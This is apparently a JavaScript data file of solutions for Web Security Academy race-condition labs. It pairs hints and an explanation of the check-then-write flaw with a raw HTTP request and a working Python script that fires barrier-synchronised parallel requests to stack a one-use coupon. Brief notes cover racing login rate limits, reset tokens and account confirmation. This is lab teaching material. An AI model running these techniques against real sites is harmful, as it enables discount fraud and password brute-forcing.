export default {
  'race-conditions-lab-race-conditions-limit-overrun': {
    note: 'A one-use coupon is checked before it is marked used; send many applications at once to stack the discount.',
    work: {
      hints: [
        'Apply the coupon once and watch the request. The server validates "not yet used", then writes the discount.',
        'That is a check-then-write pair. Fire the same request many times in parallel, not sequentially.',
        'Use a barrier so all requests leave together, then inspect the cart total. Repeat until the total is zero or negative.'
      ],
      approach:
        'The coupon state is read by each request before any request commits the "used" flag. With enough concurrency, several requests pass the check and each adds a discount. The fix is a conditional update (`UPDATE coupons SET used=1 WHERE id=? AND used=0`) whose affected-row count gates the discount.',
      request: `POST /cart/coupon HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION

csrf=TOKEN&coupon=PROMO`,
      tokens: [
        ['POST /cart/coupon', 'A state-changing endpoint that both validates and applies the coupon.'],
        ['csrf=TOKEN', 'Per-session token; fetch it once and reuse it across the parallel requests.'],
        ['coupon=PROMO', 'The shared resource under contention. Every request targets the same coupon row.'],
        ['(parallel)', 'The exploit is temporal: N requests must reach the check before any one commits the write.']
      ],
      script: `import sys, requests
from concurrent.futures import ThreadPoolExecutor
from threading import Barrier

host, coupon = sys.argv[1], sys.argv[2]
base = f"https://{host}"
s = requests.Session()
s.post(f"{base}/login", data={"username": "wiener", "password": "peter"}, timeout=20)

def token():
    page = s.get(f"{base}/cart", timeout=20).text
    return page.split('name="csrf" value="')[1].split('"')[0]

csrf = token()
barrier = Barrier(20)

def apply(_):
    barrier.wait()
    r = s.post(f"{base}/cart/coupon", data={"csrf": csrf, "coupon": coupon}, timeout=20)
    return r.status_code

with ThreadPoolExecutor(max_workers=20) as pool:
    print(list(pool.map(apply, range(20))))
print([l for l in s.get(f"{base}/cart", timeout=20).text.splitlines() if "Total" in l])`
    }
  },
  'race-conditions-lab-race-conditions-bypassing-rate-limits': {
    note: 'The login rate limiter counts after the attempt; race many password guesses to exceed the limit before the counter updates.'
  },
  'race-conditions-lab-race-conditions-multi-endpoint': {
    note: 'Two endpoints touch the same cart state; interleave add-item and apply-discount to validate one against the other.'
  },
  'race-conditions-lab-race-conditions-single-endpoint': {
    note: 'The same endpoint accepts conflicting values; send them together so the session state is written in the wrong order.'
  },
  'race-conditions-lab-race-conditions-exploiting-time-sensitive-vulnerabilities': {
    note: 'A reset token is valid only briefly; race the reset and the login to use it before invalidation.'
  },
  'race-conditions-lab-race-conditions-partial-construction': {
    note: 'The account is usable before its confirmation record is complete; race registration against the confirmation step.'
  }
}
